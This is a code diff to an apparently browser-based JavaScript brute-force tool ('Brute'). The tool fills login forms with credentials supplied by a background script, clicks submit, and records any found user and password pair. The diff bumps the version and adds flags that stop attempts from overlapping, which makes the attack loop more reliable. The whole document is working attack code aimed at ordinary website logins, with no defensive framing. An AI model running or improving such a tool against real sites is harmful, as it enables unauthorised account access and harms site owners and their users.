@@ -1,4 +1,4 @@
-VERSION = '1.21'
+VERSION = '1.22'
 
 
 function bruteforce_exception(mess)
@@ -89,6 +89,7 @@ var Brute = function()
 	this.interval = 0
 	this.creds = {}
 	this.is_running = false
+	this.is_waiting = false
 	this.is_setting_done = true
 
 	this.set_creds = function(user,password)
@@ -179,6 +180,10 @@ var Brute = function()
 
 	this.attempt = function()
 	{
+		if(this.is_waiting)
+			return
+		this.is_waiting = true
+
 		function wait_target(that)
 		{
 			bg_send_message( 
@@ -197,6 +202,7 @@ var Brute = function()
 							bg_send_message( { method: 'put_founded', data: { host: location.host, founded: { user: previously_user, password: previously_password } } } )
 							bg_send_message( { method: 'put_status', data: { host: location.host, status: { is_attack: false, is_found: true } } } )
 							//alert(previously_user + ":" + previously_password)
+							that.is_waiting = false
 							return
 						}
 						if(! target.status.is_attack && ! target.status.is_found)
@@ -207,8 +213,11 @@ var Brute = function()
 						if(! target.status.is_found)
 							//wait_for(password_field_element, that)
 							setTimeout( function() { get_creds(that) }, that.interval )
-
+						else
+							that.is_waiting = false
 					}
+					else
+						that.is_waiting = false
 				}
 			)
 		}
@@ -221,6 +230,10 @@ var Brute = function()
 		}*/
 		function get_creds(that)
 		{
+			if(that.is_running)
+				return
+			that.is_running = true
+		
 			bg_send_message( 
 				{ method: 'get_creds', data: { host: location.host } },
 				  function(creds) {
@@ -236,11 +249,7 @@ var Brute = function()
 			)
 		}
 
-		if(! this.is_running)
-		{
-			this.is_running = true
-			wait_target(this)
-		}
+		wait_target(this)
 	}
 
 	this.attack = function()
@@ -260,10 +269,15 @@ var Brute = function()
 			user_field_element.value = this.creds.user
 		password_field_element.value = this.creds.password
 		submit_field_element.click()
+		this.is_running = false
+		this.is_waiting = false
 		
 		/* if ajax */
-		this.next_attempt = this.attempt
-		this.next_attempt()
+		if(this.interval)
+		{
+			this.next_attempt = this.attempt
+			this.next_attempt()
+		}		
 	}
 }
 
